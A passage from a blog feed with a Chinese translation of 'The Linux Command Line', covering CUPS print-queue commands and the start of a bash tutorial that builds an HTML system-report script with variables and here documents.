<td>使用媒体<em>name</em>。例如，A4。</td>
</tr>
<tr>
<td>-n <em>number</em></td>
<td>输出每页<em>number</em>份副本。</td>
</tr>
<tr>
<td>-o <em>file</em></td>
<td>将输出发送到<em>file</em>。如果指定的<em>file</em>为-，则使用标准输出。</td>
</tr>
<tr>
<td>-P <em>printer</em></td>
<td>使用<em>printer</em>。如果没有指定打印机，将使用系统默认的打印机。</td>
</tr>
<tr>
<td>-R</td>
<td>纵向布局。</td>
</tr>
<tr>
<td>-r</td>
<td>横向布局。</td>
</tr>
<tr>
<td>-T <em>number</em></td>
<td>将制表位设置为每<em>number</em>个字符。</td>
</tr>
<tr>
<td>-u <em>text</em></td>
<td>以<em>text</em>为水印（底纹）覆盖页面。</td>
</tr>
</tbody></table>
<p>这只是一个总结。a2ps还有更多选项。</p>
<p><strong>注意：</strong> 还有另一个输出格式化程序对于将文本转换成PostScript很有用。叫做enscript，它可以执行许多相同类型的格式化和打印技巧，但与a2ps不同的是，它只接受文本输入。</p>
<h3 id="监控和控制打印作业"><a href="#监控和控制打印作业" class="headerlink" title="监控和控制打印作业"></a>监控和控制打印作业</h3><p>由于Unix打印系统设计用于处理来自多个用户的多个打印作业，CUPS也被设计为能做到这一点。每台打印机都被分配了一个<em>打印队列</em>，在作业可以被<em>缓冲</em>到打印机之前，它们会在这里等待。CUPS提供了几个命令行程序，用于管理打印机状态和打印队列。像lpr和lp程序一样，这些管理程序是根据Berkeley和System V打印系统的对应程序模型设计的。</p>
<h4 id="lpstat-–-显示打印系统状态"><a href="#lpstat-–-显示打印系统状态" class="headerlink" title="lpstat – 显示打印系统状态"></a>lpstat – 显示打印系统状态</h4><p>lpstat程序用于确定系统上打印机的名称和可用性。例如，如果我们的系统既有一台物理打印机（名为“printer”），又有一台PDF虚拟打印机（名为“PDF”），我们可以这样检查它们的状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ lpstat -a</span><br><span class="line">PDF自Mon 08 Dec 2017 03:05:59 PM EST起接受请求</span><br><span class="line">printer自Tue 24 Feb 2018 08:43:22 AM EST起接受请求</span><br></pre></td></tr></table></figure>

<p>进一步地，我们可以通过以下方式确定打印系统配置的更详细描述：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ lpstat -s</span><br><span class="line">系统默认目的地：printer</span><br><span class="line">PDF的设备：cups-pdf:/</span><br><span class="line">printer的设备：ipp://print-server:631/printers/printer</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们看到“printer”是系统的默认打印机，它是一台使用互联网打印协议（ipp:&#x2F;&#x2F;）连接到名为“printserver”的系统的网络打印机。</p>
<p>表22-5列出了常用选项。</p>
<p><em>表22-5：常用</em> <em>lpstat选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a [<em>printer</em>…]</td>
<td>显示<em>printer</em>的打印队列状态。注意，这是打印队列接受作业的能力的状态，而不是物理打印机的状态。如果没有指定打印机，将显示所有打印队列。</td>
</tr>
<tr>
<td>-d</td>
<td>显示系统默认打印机的名称。</td>
</tr>
<tr>
<td>-p [<em>printer</em>…]</td>
<td>显示指定<em>printer</em>的状态。如果没有指定打印机，将显示所有打印机。</td>
</tr>
<tr>
<td>-r</td>
<td>显示打印服务器的状态。</td>
</tr>
<tr>
<td>-s</td>
<td>显示状态摘要。</td>
</tr>
<tr>
<td>-t</td>
<td>显示完整的状态报告。</td>
</tr>
</tbody></table>
<h4 id="lpq-–-显示打印机队列状态"><a href="#lpq-–-显示打印机队列状态" class="headerlink" title="lpq – 显示打印机队列状态"></a>lpq – 显示打印机队列状态</h4><p>要查看打印机队列的状态，使用lpq程序。这允许我们查看队列的状态和它包含的打印作业。这是一个名为“printer”的系统默认打印机的空队列示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ lpq</span><br><span class="line">printer已准备就绪</span><br><span class="line">没有条目</span><br></pre></td></tr></table></figure>

<p>如果我们不指定打印机（使用-P选项），则显示系统的默认打印机。</p>
<p>如果我们向打印机发送作业，然后查看队列，我们将看到它列在列表中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> *.txt | <span class="built_in">pr</span> -3 | lp</span><br><span class="line">请求<span class="built_in">id</span>为printer-603（1个文件）</span><br><span class="line">[me@linuxbox ~]$ lpq</span><br><span class="line">printer已准备就绪并正在打印</span><br><span class="line">排名 所有者 作业 文件 总大小</span><br><span class="line">活跃 me 603 (stdin) 1024字节</span><br></pre></td></tr></table></figure>

<h4 id="lprm-cancel-–-取消打印作业"><a href="#lprm-cancel-–-取消打印作业" class="headerlink" title="lprm &#x2F; cancel – 取消打印作业"></a>lprm &#x2F; cancel – 取消打印作业</h4><p>CUPS提供了两个用于终止打印作业并将它们从打印队列中删除的程序。一个是Berkeley风格的（lprm），另一个是System V的（cancel）。它们在支持的选项上略有不同，但基本上做相同的事情。使用我们之前的打印作业作为示例，我们可以这样停止作业并将其删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cancel 603</span><br><span class="line">[me@linuxbox ~]$ lpq</span><br><span class="line">printer已准备就绪</span><br><span class="line">没有条目</span><br></pre></td></tr></table></figure>

<p>每个命令都有选项，用于删除属于特定用户、特定打印机的所有作业，以及多个作业编号。它们各自的手册页包含了所有细节。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们看到了过去的打印机如何影响了类Unix机器上打印系统的设计，以及命令行上可用于控制打印作业的调度和执行、以及各种输出选项的控制有多大。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>关于PostScript页面描述语言的好文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Qb3N0U2NyaXB0">http://en.wikipedia.org/wiki/PostScript<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>通用Unix打印系统（CUPS）：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Db21tb25fVW5peF9QcmludGluZ19TeXN0ZW0=">http://en.wikipedia.org/wiki/Common_Unix_Printing_System<i class="fa fa-external-link-alt"></i></span><span class="exturl" data-url="aHR0cDovL3d3dy5jdXBzLm9yZy8=">http://www.cups.org/<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>Berkeley和System V打印系统：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9CZXJrZWxleV9wcmludGluZ19zeXN0ZW0=">http://en.wikipedia.org/wiki/Berkeley_printing_system<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TeXN0ZW1fVl9wcmludGluZ19zeXN0ZW0=">http://en.wikipedia.org/wiki/System_V_printing_system<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>启动一个项目</title>
    <url>/2024/04/25-starting-a-project/</url>
    <content><![CDATA[<h2 id="25-–-启动一个项目"><a href="#25-–-启动一个项目" class="headerlink" title="25 – 启动一个项目"></a>25 – 启动一个项目</h2><p>从本章开始，我们将开始构建一个程序。这个项目的目的是看看各种 shell 功能如何用于创建程序，更重要的是，创建<em>好的</em>程序。</p>
<p>我们将编写的程序是一个<em>报告生成器</em>。它将展示我们的系统及其状态的各种统计信息，并以 HTML 格式产生这份报告，因此我们可以使用 Firefox 或 Chrome 等网络浏览器查看它。</p>
<span id="more"></span>

<p>程序通常是通过一系列阶段构建的，每个阶段添加功能和能力。我们程序的第一阶段将产生一个包含最少系统信息的最小 HTML 文档。更多的内容将在后面添加。</p>
<h3 id="第一阶段：最小文档"><a href="#第一阶段：最小文档" class="headerlink" title="第一阶段：最小文档"></a>第一阶段：最小文档</h3><p>我们需要知道的第一件事是格式良好的 HTML 文档的格式。它看起来是这样的：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">title</span>&gt;</span>页面标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  	页面主体。</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果我们将这个输入到我们的文本编辑器中并将文件保存为 foo.html，我们可以在 Firefox 中使用以下 URL 查看文件：</p>
<blockquote>
<p>file:&#x2F;&#x2F;&#x2F;home&#x2F;<em>username</em>&#x2F;foo.html</p>
</blockquote>
<p>我们程序的第一阶段将能够将此 HTML 文件输出到标准输出。我们可以很容易地编写一个程序来做到这一点。让我们启动文本编辑器并创建一个名为 ~&#x2F;bin&#x2F;sys_info_page 的新文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ vim ~/bin/sys_info_page</span><br></pre></td></tr></table></figure>

<p>输入以下程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出系统信息页面</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &lt;head&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &lt;title&gt;页面标题&lt;/title&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &lt;/head&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &lt;body&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; 页面主体。&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &lt;/body&gt;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们对这个问题的第一次尝试包含了一个 shebang，一个注释（总是一个好主意），以及一系列的 echo 命令，每行输出一个。保存文件后，我们将使其可执行并尝试运行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">chmod</span> 755 ~/bin/sys_info_page</span><br><span class="line">[me@linuxbox ~]$ sys_info_page</span><br></pre></td></tr></table></figure>

<p>当程序运行时，我们应该看到屏幕上显示的 HTML 文档的文本，因为脚本中的 echo 命令将它们的输出发送到标准输出。我们将再次运行程序并将程序的输出重定向到文件 sys_info_page.html，以便我们可以用网络浏览器查看结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sys_info_page &gt; sys_info_page.html</span><br><span class="line">[me@linuxbox ~]$ firefox sys_info_page.html</span><br></pre></td></tr></table></figure>

<p>到目前为止，一切都很好。</p>
<p>编写程序时，始终力求简单和清晰是一个好主意。当程序易于阅读和理解时，维护就更容易，更不用说这也可以通过减少打字量使编程更加容易。我们当前版本的程序工作正常，但它可以更简单。我们实际上可以将所有的 echo 命令合并为一个，这肯定会使向程序的输出中添加更多行变得更容易。所以，让我们将程序改为这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出系统信息页面</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;页面标题&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		页面主体。</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>引号字符串可以包含换行符，因此可以包含多行文本。shell 会继续读取文本，直到遇到关闭引号。这在命令行上也是这样工作的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">&gt; 	&lt;head&gt;</span></span><br><span class="line"><span class="string">&gt; 		&lt;title&gt;页面标题&lt;/title&gt;</span></span><br><span class="line"><span class="string">&gt; 	&lt;/head&gt;</span></span><br><span class="line"><span class="string">&gt; 	&lt;body&gt;</span></span><br><span class="line"><span class="string">&gt; 		页面主体。</span></span><br><span class="line"><span class="string">&gt; 	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&gt; &lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>前导的“&gt;”字符是包含在 PS2 shell 变量中的 shell 提示符。每当我们在 shell 中输入多行语句时，它就会出现。这个功能现在有点晦涩，但稍后，当我们讨论多行编程语句时，它将变得非常方便。</p>
<h3 id="第二阶段：添加一点数据"><a href="#第二阶段：添加一点数据" class="headerlink" title="第二阶段：添加一点数据"></a>第二阶段：添加一点数据</h3><p>现在我们的程序可以生成一个最小的文档，让我们在报告中加入一些数据。为此，我们将做出以下更改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出一个系统信息页面</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;系统信息报告&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;系统信息报告&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们在报告的正文中添加了页面标题和标题。</p>
<h3 id="变量和常量"><a href="#变量和常量" class="headerlink" title="变量和常量"></a>变量和常量</h3><p>然而，我们的脚本存在一个问题。注意到“系统信息报告”这个字符串是重复的吗？对于我们这个微小的脚本来说不是问题，但让我们想象一下，如果我们的脚本非常长并且我们有多个这个字符串的实例。如果我们想要将标题改为其他内容，我们将不得不在多个地方进行更改，这可能是一项大工作。如果我们能安排脚本，使得字符串只出现一次而不是多次呢？这将使脚本未来的维护变得容易得多。以下是我们可以做到这一点的方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出一个系统信息页面</span></span><br><span class="line">title=<span class="string">&quot;系统信息报告&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;<span class="variable">$title</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;<span class="variable">$title</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过创建一个名为 title 的<em>变量</em>并为其赋值系统信息报告，我们可以利用参数扩展并将字符串放置在多个位置。</p>
<p>那么，我们如何创建一个变量？简单，我们只需要使用它。当 shell 遇到一个变量时，它会自动创建它。这与许多编程语言不同，在这些语言中，使用变量之前必须明确地<em>声明</em>或定义。shell 对此非常宽松，这可能会导致一些问题。例如，考虑在命令行上执行的这个场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=<span class="string">&quot;yes&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line"><span class="built_in">yes</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$fool</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>我们首先将值 yes 分配给变量 foo，然后我们使用 echo 显示它的值。接下来我们显示变量名拼写错误为 fool 的值，并得到一个空白结果。这是因为 shell 在遇到它时愉快地创建了变量 fool 并给它默认值为无，或空。从这个例子中，我们学到我们必须非常注意我们的拼写！也很重要的是要理解这个例子中真正发生了什么。从我们之前看到的 shell 如何执行扩展中，我们知道以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br></pre></td></tr></table></figure>

<p>经历了参数扩展并产生了以下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>相比之下，以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$fool</span></span><br></pre></td></tr></table></figure>

<p>扩展成这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>

<p>空变量扩展成了什么都没有！这可能会给需要参数的命令造成混乱。这里有一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=foo.txt</span><br><span class="line">[me@linuxbox ~]$ foo1=foo1.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cp</span> <span class="variable">$foo</span> <span class="variable">$fool</span></span><br><span class="line"><span class="built_in">cp</span>: missing destination file operand after `foo.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Try `cp --help&#x27;</span> <span class="keyword">for</span> more information.</span><br></pre></td></tr></table></figure>

<p>我们为两个变量 foo 和 foo1 分配了值。然后我们执行 cp 但拼写错误了第二个参数的名称。扩展后，cp 命令只发送了一个参数，尽管它需要两个。</p>
<p>关于变量名称有一些规则：</p>
<ol>
<li>变量名可以由字母数字字符（字母和数字）和下划线字符组成。</li>
<li>变量名的第一个字符必须是字母或下划线。</li>
<li>不允许使用空格和标点符号。</li>
</ol>
<p>“变量”这个词意味着一个变化的值，在许多应用中，变量以这种方式使用。然而，我们应用中的变量 title 被用作<em>常量</em>。常量就像变量一样，它有一个名称并包含一个值。不同的是，常量的值不会改变。在执行几何计算的应用程序中，我们可能将 PI 定义为常量并为其赋值为 3.1415，而不是在我们的程序中直接使用这个数字。shell 对变量和常量之间没有区别；它们主要是为了程序员的方便。一个常见的约定是使用大写字母来指定常量，使用小写字母指定真正的变量。我们将修改我们的脚本以符合这个约定：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出一个系统信息页面</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;<span class="variable">$TITLE</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;<span class="variable">$TITLE</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们还借此机会通过添加 shell 变量 HOSTNAME 的值来增强我们的标题。这是机器的网络名称。</p>
<p><strong>注意</strong>：shell 实际上确实提供了一种方法通过使用带有 -r（只读）选项的 declare 内置命令来强制常量的不变性。如果我们这样分配 TITLE：</p>
<blockquote>
<p>declare -r TITLE&#x3D;”页面标题”</p>
</blockquote>
<p>shell 会阻止对 TITLE 的任何后续赋值。这个特性很少被使用，但它存在于非常正式的脚本中。</p>
<h4 id="给变量和常量赋值"><a href="#给变量和常量赋值" class="headerlink" title="给变量和常量赋值"></a>给变量和常量赋值</h4><p>这里我们的扩展知识真正开始发挥作用。正如我们所见，变量被赋值的方式如下：</p>
<blockquote>
<p><em>变量</em>&#x3D;<em>值</em></p>
</blockquote>
<p>其中 <em>变量</em> 是变量的名称，<em>值</em> 是一个字符串。与其他一些编程语言不同，shell 不关心赋给变量的数据类型；它将它们全部视为字符串。您可以通过使用带有 -i 选项的 declare 命令来强制 shell 将赋值限制为整数，但是，像将变量设置为只读一样，这很少做。</p>
<p>注意，在赋值中，变量名称、等号和值之间不能有空格。那么值可以由什么组成呢？它可以包含我们能扩展成一个字符串的任何东西。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=z <span class="comment"># 将字符串 &quot;z&quot; 赋值给变量 a。</span></span><br><span class="line">b=<span class="string">&quot;a string&quot;</span> <span class="comment"># 嵌入的空格必须在引号内。</span></span><br><span class="line">c=<span class="string">&quot;a string and <span class="variable">$b</span>&quot;</span> <span class="comment"># 其他扩展，如变量，可以被扩展到赋值中。</span></span><br><span class="line">d=<span class="string">&quot;<span class="subst">$(ls -l foo.txt)</span>&quot;</span> <span class="comment"># 命令的结果。</span></span><br><span class="line">e=$((<span class="number">5</span> * <span class="number">7</span>)) <span class="comment"># 算术扩展。</span></span><br><span class="line">f=<span class="string">&quot;\t\ta string\n&quot;</span> <span class="comment"># 转义序列，如制表符和换行符。</span></span><br></pre></td></tr></table></figure>

<p>多个变量赋值可以在一行上完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=5 b=<span class="string">&quot;a string&quot;</span></span><br></pre></td></tr></table></figure>

<p>在扩展过程中，变量名可以被可选的花括号 {} 包围。当变量名由于其周围的上下文变得模糊不清时，这很有用。这里，我们尝试使用变量将文件名从 myfile 更改为 myfile1：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ filename=<span class="string">&quot;myfile&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$filename</span>&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> <span class="string">&quot;<span class="variable">$filename1</span>&quot;</span></span><br><span class="line"><span class="built_in">mv</span>: 缺少目的文件操作数 `myfile<span class="string">&#x27;</span></span><br><span class="line"><span class="string">尝试 `mv --help&#x27;</span> 获取更多信息。</span><br></pre></td></tr></table></figure>

<p>这次尝试失败了，因为 shell 将 mv 命令的第二个参数解释为一个新的（且为空的）变量。这个问题可以通过以下方式解决：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;filename&#125;</span>1&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过添加周围的大括号，shell 不再将尾随的 1 解释为变量名的一部分。</p>
<p><strong>注意：</strong> 好的做法是将变量和命令替换用双引号括起来，以限制 shell 的单词分割效果。当变量可能包含文件名时，引用尤其重要。</p>
<p>我们将借此机会向我们的报告中添加一些数据，即创建报告的日期和时间以及创建者的用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出一个系统信息页面</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">CURRENT_TIME=<span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%x %r %Z&quot;</span>)</span>&quot;</span></span><br><span class="line">TIMESTAMP=<span class="string">&quot;生成于 <span class="variable">$CURRENT_TIME</span>，由 <span class="variable">$USER</span> 创建&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;<span class="variable">$TITLE</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;<span class="variable">$TITLE</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> 	&lt;p&gt;<span class="variable">$TIMESTAMP</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="这里文档"><a href="#这里文档" class="headerlink" title="这里文档"></a>这里文档</h3><p>我们已经看过两种不同的输出文本的方法，都是使用 echo 命令。还有第三种方法称为<em>这里文档</em>（here document）或<em>这里脚本</em>。这里文档是一种额外的 I&#x2F;O 重定向形式，在此我们将一段文本嵌入到我们的脚本中，并将其喂给命令的标准输入。它的工作方式如下：</p>
<pre><code>command &lt;&lt; token
text
token
</code></pre>
<p>其中 <em>command</em> 是接受标准输入的命令的名称，<em>token</em> 是用来指示嵌入文本结束的字符串。这里我们将修改我们的脚本以使用这里文档：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序用于输出一个系统信息页面</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">CURRENT_TIME=<span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%x %r %Z&quot;</span>)</span>&quot;</span></span><br><span class="line">TIMESTAMP=<span class="string">&quot;生成于 <span class="variable">$CURRENT_TIME</span>，由 <span class="variable">$USER</span> 创建&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">_EOF_</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;$TITLE&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;$TITLE&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> 	&lt;p&gt;$TIMESTAMP&lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">_EOF_</span></span><br></pre></td></tr></table></figure>

<p>我们的脚本现在不使用 echo，而是使用 cat 和这里文档。字符串 _EOF_（意味着<em>文件结束</em>，一个常见的约定）被选作标记，并标志着嵌入文本的结束。注意标记必须单独出现，且该行不能有尾随空格。</p>
<p>那么，使用这里文档的优势是什么呢？它与 echo 大体相同，除了默认情况下，这里文档中的单引号和双引号对 shell 来说失去了它们的特殊含义。这是一个命令行示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=<span class="string">&quot;一些文本&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &lt;&lt; <span class="string">_EOF_</span></span><br><span class="line"><span class="string">&gt; $foo</span></span><br><span class="line"><span class="string">&gt; &quot;$foo&quot;</span></span><br><span class="line"><span class="string">&gt; &#x27;$foo&#x27;</span></span><br><span class="line"><span class="string">&gt; \$foo</span></span><br><span class="line"><span class="string">&gt; _EOF_</span></span><br><span class="line">一些文本</span><br><span class="line"><span class="string">&quot;一些文本&quot;</span></span><br><span class="line"><span class="string">&#x27;一些文本&#x27;</span></span><br><span class="line"><span class="variable">$foo</span></span><br></pre></td></tr></table></figure>

<p>正如我们所见，shell 不注意引号。它将它们视为普通字符。这允许我们在这里文档中自由嵌入引号。这对我们的报告程序来说可能会很方便。</p>
<p>这里文档可以与任何接受标准输入的命令一起使用。在这个示例中，我们使用这里文档将一系列命令传递给 ftp 程序，以从远程 FTP 服务器检索文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 脚本通过 FTP 检索文件</span></span><br><span class="line">FTP_SERVER=ftp.nl.debian.org</span><br><span class="line">FTP_PATH=/debian/dists/stretch/main/installer-amd64/current/images/</span><br><span class="line">REMOTE_FILE=debian-cd_info.tar.gz</span><br><span class="line">ftp -n &lt;&lt; <span class="string">_EOF_</span></span><br><span class="line"><span class="string">open $FTP_SERVER</span></span><br><span class="line"><span class="string">user anonymous me@linuxbox</span></span><br><span class="line"><span class="string">cd $FTP_PATH</span></span><br><span class="line"><span class="string">hash</span></span><br><span class="line"><span class="string">get $REMOTE_FILE</span></span><br><span class="line"><span class="string">bye</span></span><br><span class="line"><span 